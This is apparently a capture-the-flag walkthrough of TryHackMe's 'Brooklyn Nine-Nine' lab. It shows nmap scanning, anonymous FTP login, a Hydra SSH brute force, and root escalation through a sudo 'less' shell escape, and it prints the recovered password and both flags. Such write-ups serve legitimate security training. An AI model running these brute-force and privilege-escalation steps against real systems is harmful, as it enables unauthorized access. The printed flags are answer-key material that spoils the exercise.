# TryHackMe — Brooklyn Nine-Nine

![Difficulty](https://img.shields.io/badge/Difficulty-Easy-green)
![Focus](https://img.shields.io/badge/Focus-FTP%20%7C%20SSH%20%7C%20Sudo-blue)
![Target](https://img.shields.io/badge/Target-Linux-orange)
![Status](https://img.shields.io/badge/Status-Pwned-success)

## Overview

This report documents my walkthrough of the **Brooklyn Nine-Nine** room on TryHackMe, using the screenshots supplied with this report.

The path shown in the screenshots is:

1.  Enumerate the target and discover FTP, SSH, and HTTP.
2.  Use anonymous FTP to retrieve a note about Jake's weak password.
3.  Recover Jake's SSH password with Hydra.
4.  Log in as `jake` and retrieve the user flag from Holt's home directory.
5.  Discover that `jake` can run `less` as root with `sudo`.
6.  Escape from `less` to a shell and retrieve the root flag.

## Attack chain

``` text
Nmap enumeration
      |
      v
Anonymous FTP access
      |
      v
Read note_to_jake.txt: weak-password hint
      |
      v
Hydra finds Jake's SSH password
      |
      v
SSH as jake
      |
      v
Read /home/holt/user.txt
      |
      v
sudo -l -> NOPASSWD: /usr/bin/less
      |
      v
Use less shell escape (!/bin/sh)
      |
      v
Root shell -> /root/root.txt
```

## 1. Enumerate the target

Run a service/version scan with default scripts:

``` bash
nmap -sV -sC <TARGET_IP>
```

The scan in the screenshot identifies:

        Port Service   Finding
  ---------- --------- ---------------------------------------
    `21/tcp` FTP       vsftpd 3.0.3; anonymous login allowed
    `22/tcp` SSH       OpenSSH 7.6p1 on Ubuntu
    `80/tcp` HTTP      Apache httpd 2.4.29 on Ubuntu

The FTP scan also reveals a file named `note_to_jake.txt`.

<img width="795" height="565" alt="1" src="https://github.com/user-attachments/assets/e4b37a49-0fdf-4c43-9789-97d0213f6044" />

## 2. Connect to anonymous FTP

Connect to the target:

``` bash
ftp <TARGET_IP>
```

When prompted for a username, enter `anonymous`. If a password is requested, press Enter or use a placeholder email address.

``` text
Name: anonymous
Password: [press Enter]
```

List the available files:

``` text
ls
```

The FTP server contains `note_to_jake.txt`.

<img width="658" height="253" alt="2" src="https://github.com/user-attachments/assets/97b5d7bc-527f-4da2-bc42-9e7eea2f97e8" />

Read the note from the FTP prompt:

``` text
less note_to_jake.txt
```

The note warns Jake that his password is weak and says Holt will be angry if someone hacks the Nine-Nine.

<img width="863" height="111" alt="3" src="https://github.com/user-attachments/assets/e73a3190-63fa-47a4-b1fd-02110e8feb77" />

## 3. Brute-force Jake's SSH password

Use Hydra with the `rockyou.txt` password list to test the `jake` SSH account. This is appropriate only for the authorized lab target.

``` bash
hydra -l jake -P /usr/share/wordlists/rockyou.txt ssh://<TARGET_IP>
```

The screenshot shows the recovered credentials:

``` text
Username: jake
Password: 987654321
```

<img width="733" height="286" alt="4" src="https://github.com/user-attachments/assets/6346af84-4503-445c-9e2e-910f7aa7d114" />

## 4. Log in as `jake`

Connect over SSH:

``` bash
ssh jake@<TARGET_IP>
```

Enter the recovered password when prompted:

``` text
987654321
```

The screenshot confirms a shell on the host `brookly_nine_nine`.

<img width="677" height="212" alt="5" src="https://github.com/user-attachments/assets/674b29a3-1d33-490a-8c73-a50228ad9b86" />

## 5. Enumerate local files and retrieve the user flag

Inspect the home directory and hidden files:

``` bash
ls -la
```

The screenshot shows directories for users including `amy`, `holt`, `jake`, and `root`. Navigate to Holt's home directory:

<img width="582" height="344" alt="6" src="https://github.com/user-attachments/assets/5de004e8-ae23-484f-8231-6e88dab1913c" />

``` bash
cd /home/holt
ls
cat user.txt
```

The user flag shown in the screenshot is:

``` text
ee11cbb19052e40b07aac0ca060c23ee
```

<img width="417" height="118" alt="7" src="https://github.com/user-attachments/assets/51cb0827-fafa-4c1d-a02a-4d22df880cab" />

## 6. Check sudo permissions

Check which commands Jake can execute with elevated privileges:

``` bash
sudo -l
```

The output shows that Jake may run `less` as any user without a password:

``` text
(ALL) NOPASSWD: /usr/bin/less
```

<img width="1015" height="101" alt="8" src="https://github.com/user-attachments/assets/605f46e1-f016-433e-8578-cf3e9a26b071" />

## 7. Escape from `less` to a shell

Because `less` can execute shell commands, the permitted command can be abused to obtain a shell with the privileges used to launch it.

Open a file using the allowed command:

``` bash
sudo less /etc/hosts
```

<img width="463" height="26" alt="9-1" src="https://github.com/user-attachments/assets/0216b6d6-9fbd-4e30-8d15-73f9b59a9e7a" />

Inside `less`, type the following and press Enter:

``` text
!/bin/sh
```

This invokes a shell from the pager. Since `less` was started through `sudo`, the shell inherits the elevated privileges permitted by the sudo rule.

<img width="159" height="53" alt="9-2" src="https://github.com/user-attachments/assets/8593ed07-f9cc-423a-90c6-b1ded952e656" />

Verify the effective identity:

``` bash
id
```

The screenshot shows:

``` text
uid=0(root) gid=0(root) groups=0(root)
```

<img width="346" height="43" alt="10" src="https://github.com/user-attachments/assets/c4bf9a2c-ce67-43c4-a3cd-0fd51b2b2816" />

## 8. Retrieve the root flag

From the root shell, read the root flag:

``` bash
cd /root
ls
cat root.txt
```

The root flag shown in the screenshot is:

``` text
63a9f0ea7bb98050796b649e85481845
```

<img width="474" height="159" alt="11" src="https://github.com/user-attachments/assets/7ad09753-f829-4433-b654-f09aa9786fc7" />

## Flags

  User   `ee11cbb19052e40b07aac0ca060c23ee`
  Root   `63a9f0ea7bb98050796b649e85481845`
